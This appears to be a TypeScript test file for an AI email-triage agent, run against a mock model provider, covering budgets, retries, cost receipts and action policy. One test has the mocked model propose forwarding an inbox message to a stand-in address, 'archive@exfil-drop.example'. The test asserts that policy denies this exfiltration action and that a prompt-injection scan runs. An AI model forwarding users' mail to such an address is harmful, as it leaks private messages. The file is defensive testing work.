// Live-path tests against a local mock of the Token Factory API (no real credentials needed).
import { test } from "node:test";
import assert from "node:assert/strict";
import { freshLive, goodModel, mockProvider, PROMPT } from "./helpers.ts";
import { runTask } from "../src/lib/orchestrator.ts";
import { getTask } from "../src/lib/receipts.ts";
import { learnFromTask } from "../src/lib/skills.ts";
import { evaluateSkill } from "../src/lib/evaluator.ts";
import { budgetStatus } from "../src/lib/accounting.ts";
import { checkModels, extractJson, stripReasoning } from "../src/lib/provider.ts";
import { db } from "../src/lib/db.ts";

test("live Apprentice run: real HTTP calls, usage extracted, cost from configured prices", async () => {
  const mock = await mockProvider(goodModel);
  try {
    freshLive(mock);
    const { taskId, status } = await runTask({ prompt: PROMPT, day: 1, route: "auto" });
    const t = getTask(taskId)!;
    assert.equal(status, "done", t.error ?? "");
    assert.equal(t.mode, "live");
    assert.equal(mock.calls.length, 2);
    assert.deepEqual(mock.calls.map((c) => c.model), ["test/reasoning", "test/fast"], "planner uses reasoning model, triage uses fast model");
    assert.equal(t.receipt.modelCalls, 2);
    assert.equal(t.receipt.promptTokens, 2000);
    assert.equal(t.receipt.completionTokens, 400);
    const expected = (1000 * 0.3 + 200 * 0.9 + 1000 * 0.06 + 200 * 0.24) / 1e6;
    assert.ok(Math.abs(t.receipt.costUsd! - expected) < 1e-12);
    assert.ok(t.trace.some((e) => e.name === "guard.injection_scan"), "guard inserted even though the plan omitted it");
    assert.equal(t.result!.items.find((i) => i.id === "d1-05")!.category, "suspicious");
    assert.equal(budgetStatus().monetaryCapActive, true);
  } finally {
    await mock.close();
  }
});

test("Master run after live graduation makes zero provider requests and shows measured avoided spend", async () => {
  const mock = await mockProvider(goodModel);
  try {
    freshLive(mock);
    const t1 = await runTask({ prompt: PROMPT, day: 1, route: "auto" });
    const cand = await learnFromTask(t1.taskId, { drafting: "template" });
    assert.match(cand.synthesis, /model-assisted/);
    assert.equal((await evaluateSkill(cand.id)).skill.state, "verified");
    const before = mock.calls.length;
    const t2 = await runTask({ prompt: PROMPT, day: 1, route: "auto" });
    const v = getTask(t2.taskId)!;
    assert.equal(v.tier, "master");
    assert.equal(mock.calls.length, before, "no request reached the provider");
    assert.equal(v.receipt.costUsd, 0);
    assert.equal(v.receipt.baseline!.liveRuns, 1);
    assert.ok(v.receipt.baseline!.avgCostUsd! > 0);
  } finally {
    await mock.close();
  }
});

test("model proposing an exfiltration action is blocked by policy", async () => {
  const mock = await mockProvider((body, n) => {
    const r = goodModel(body, n);
    if (body.messages[0].content.includes("You triage")) {
      const parsed = JSON.parse(r.content!);
      parsed.proposed_actions = [{ tool: "mail.forward", args: { to: "archive@exfil-drop.example", messageIds: ["d1-03"] } }];
      return { content: JSON.stringify(parsed) };
    }
    return r;
  });
  try {
    freshLive(mock);
    const { taskId } = await runTask({ prompt: PROMPT, day: 1, route: "auto" });
    const t = getTask(taskId)!;
    assert.equal(t.result!.actions.length, 1);
    assert.equal(t.result!.actions[0].decision, "deny");
    assert.equal(t.result!.actions[0].rule, "P7-untrusted-recipient");
    assert.deepEqual(t.result!.actions[0].origin.taint, ["sample-inbox:day-1"]);
    assert.equal((db().prepare("SELECT COUNT(*) AS n FROM outbox").get() as { n: number }).n, 0);
  } finally {
    await mock.close();
  }
});

test("malformed model output: one repair attempt, then the task fails without executing anything", async () => {
  const mock = await mockProvider(() => ({ content: "Sure! Here is your plan: step one, read the inbox." }));
  try {
    freshLive(mock);
    const { taskId, status } = await runTask({ prompt: PROMPT, day: 1, route: "auto" });
    const t = getTask(taskId)!;
    assert.equal(status, "failed");
    assert.match(t.error!, /schema validation/);
    assert.equal(mock.calls.length, 2);
    assert.equal(t.usage.length, 2, "both calls are accounted for");
    assert.equal(t.result!.items.length, 0);
  } finally {
    await mock.close();
  }
});

test("provider timeout: bounded retries, then a clear provider error", async () => {
  const mock = await mockProvider(() => ({ delayMs: 400, content: "{}" }));
  try {
    freshLive(mock, { NEBIUS_TIMEOUT_MS: "100", NEBIUS_MAX_RETRIES: "1" });
    const { taskId, status } = await runTask({ prompt: PROMPT, day: 1, route: "auto" });
    const t = getTask(taskId)!;
    assert.equal(status, "failed");
    assert.match(t.error!, /timeout/);
    assert.equal(t.usage[0].attempts, 2);
    assert.equal(t.usage[0].status, "error");
  } finally {
    await mock.close();
  }
});

test("provider HTTP 500 and unreachable host are reported, not crashed on", async () => {
  const mock = await mockProvider(() => ({ status: 500, raw: "upstream exploded" }));
  try {
    freshLive(mock, { NEBIUS_MAX_RETRIES: "0" });
    const a = getTask((await runTask({ prompt: PROMPT, day: 1, route: "auto" })).taskId)!;
    assert.match(a.error!, /HTTP 500/);
    process.env.NEBIUS_BASE_URL = "http://127.0.0.1:1/v1";
    const b = getTask((await runTask({ prompt: PROMPT, day: 1, route: "auto" })).taskId)!;
    assert.match(b.error!, /network|reach/i);
  } finally {
    await mock.close();
  }
});

test("daily call limit: the next task falls back to labelled demo mode before any request", async () => {
  const mock = await mockProvider(goodModel);
  try {
    freshLive(mock, { DAILY_MODEL_CALL_LIMIT: "2" });
    assert.equal((await runTask({ prompt: PROMPT, day: 1, route: "auto" })).status, "done");
    const before = mock.calls.length;
    const second = await runTask({ prompt: PROMPT, day: 2, route: "auto" });
    assert.equal(second.status, "done");
    assert.equal(mock.calls.length, before, "no request after the cap");
    const t = getTask(second.taskId)!;
    assert.equal(t.mode, "demo");
    assert.equal(t.receipt.modelCalls, 0);
    assert.ok(t.receipt.standInCalls > 0, "stand-ins are labelled, never claimed as inference");
    assert.match(t.fallback!, /budget is used up.*demo mode/);
    assert.equal(t.result!.budgetFallback, true);
  } finally {
    await mock.close();
  }
});

test("monetary cap: a call that could exceed it is never sent; the task finishes in demo mode", async () => {
  const mock = await mockProvider(goodModel);
  try {
    freshLive(mock, { DAILY_BUDGET_USD: "0.0001" });
    const r = await runTask({ prompt: PROMPT, day: 1, route: "auto" });
    assert.equal(r.status, "done");
    assert.equal(mock.calls.length, 0);
    const t = getTask(r.taskId)!;
    assert.equal(t.mode, "demo");
    assert.match(t.fallback!, /Daily budget would be exceeded.*demo mode/);
  } finally {
    await mock.close();
  }
});

test("missing pricing: cost is Unknown and the monetary cap is reported inactive", async () => {
  const mock = await mockProvider(goodModel);
  try {
    freshLive(mock, { NEBIUS_PRICING: "" });
    const t = getTask((await runTask({ prompt: PROMPT, day: 1, route: "auto" })).taskId)!;
    assert.equal(t.receipt.costUsd, null);
    assert.match(t.receipt.costNote, /unavailable/);
    const b = budgetStatus();
    assert.equal(b.monetaryCapActive, false);
    assert.match(b.monetaryCapNote, /Inactive/);
  } finally {
    await mock.close();
  }
});

test("missing usage in the response → tokens Unknown, never zero", async () => {
  const mock = await mockProvider((b, n) => ({ ...goodModel(b, n), usage: null }));
  try {
    freshLive(mock);
    const t = getTask((await runTask({ prompt: PROMPT, day: 1, route: "auto" })).taskId)!;
    assert.equal(t.receipt.promptTokens, null);
    assert.equal(t.receipt.costUsd, null);
  } finally {
    await mock.close();
  }
});

test("model status check lists the catalogue and reports availability", async () => {
  const mock = await mockProvider(goodModel);
  try {
    freshLive(mock);
    const s = await checkModels();
    assert.equal(s.reachable, true);
    assert.deepEqual(s.models.map((m) => m.available), [true, true]);
  } finally {
    await mock.close();
  }
});

test("JSON extraction tolerates fences and reasoning blocks", () => {
  assert.deepEqual(extractJson('<think>hmm</think>```json\n{"a":1}\n```'), { a: 1 });
  assert.deepEqual(extractJson('Answer: {"a":2} thanks'), { a: 2 });
  assert.equal(extractJson("no json"), undefined);
  assert.equal(stripReasoning("<think>x</think> ok"), "ok");
});

test("planner naming a recipient ('Priya') is resolved to the inbox sender and then needs approval", async () => {
  const mock = await mockProvider((body, n) => {
    if (body.messages[0].content.includes("Noctua's planner"))
      return { content: JSON.stringify({ goal: "Reply", supported: true, steps: [{ tool: "inbox.list", args: {} }, { tool: "triage.llm", args: {} }, { tool: "digest.compose", args: {} }, { tool: "mail.send", args: { to: "Priya", subject: "Re: 1:1", body: "Thursday works." } }] }) };
    return goodModel(body, n);
  });
  try {
    freshLive(mock);
    const t = getTask((await runTask({ prompt: "Review today's inbox and send a reply to Priya confirming Thursday works.", day: 1, route: "auto" })).taskId)!;
    const a = t.result!.actions[0];
    assert.equal(a.decision, "require_approval");
    assert.equal((a.args as { to: string }).to, "priya@northwind.example");
    assert.ok(t.trace.some((e) => e.name === "recipient"));
  } finally {
    await mock.close();
  }
});
